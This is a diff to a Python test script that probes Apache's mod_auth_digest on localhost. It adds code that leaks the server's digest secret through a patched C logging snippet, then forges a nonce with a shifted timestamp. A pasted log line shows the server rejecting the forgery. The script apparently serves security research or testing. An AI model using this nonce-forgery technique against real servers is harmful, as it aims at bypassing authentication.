@@ -37,18 +37,19 @@ def auth(v):
 
 def preauth():
     r = requests.get(host + url)
+    print r
     r.headers['www-authenticate'].split(', ')
     return dict([ a.split('=',1) for a in r.headers['www-authenticate'].split(', ') ])
 
 
 url='/digest/'
-host = 'http://localhost:801'
+host = 'http://localhost:802'
 
 v = preauth()
 
-#print v
 username="username"
 password = "password"
+print v
 
 realm = 'so far away'
 r = auth(v)
@@ -95,5 +96,54 @@ import time
 time.sleep(1)
 
 r = auth(v)
+print r.status_code,r.headers, r.text
+
+# Obtained by putting the following code in modules/aaa/mod_auth_digest.c
+# in the function initialize_secret
+#    {
+#       const char *hex = "0123456789abcdef";
+#       char secbuff[SECRET_LEN * 4];
+#       char *hash = secbuff;
+#       int idx;
+
+#       for (idx=0; idx<sizeof(secret); idx++) {
+#       *hash++ = hex[secret[idx] >> 4];
+#       *hash++ = hex[secret[idx] & 0xF];
+#       }
+#       *hash = '\0';
+#       /* remove comment in below for apache-2.4+ */
+#       ap_log_error(APLOG_MARK, APLOG_NOTICE, 0, s, /*  APLOGNO(11759) */ "secret: %s", secbuff);
+#   }
+
+
+import sha
+import binascii
+import base64
+import struct
+
+apachesecret = binascii.unhexlify('cc969f83b4029e672115f2e8ff7dd21a976728f9')
+s = sha.sha(apachesecret)
+
+v=preauth()
+
+print v['nonce']
+realm = v['Digest realm'][1:-1]
+
+(t,) = struct.unpack('l',base64.b64decode(v['nonce'][1:13]))
+
+# whee, time travel
+t = t + 5540
+
+timepac = base64.b64encode(struct.pack('l',t))
+
+s.update(realm)
+s.update(timepac)
+
+v['nonce'] =  v['nonce'][0] + timepac + s.hexdigest() + v['nonce'][-1]
+
+print v
+
+r = auth(v)
+#[Mon Jul 29 02:12:55.539813 2013] [auth_digest:error] [pid 9647:tid 139895522670336] [client 127.0.0.1:58474] AH01777: invalid nonce 59QJppTiBAA=b08983fd166ade9840407df1b0f75b9e6e07d88d received - user attempted time travel
 print r.status_code,r.headers, r.text
 
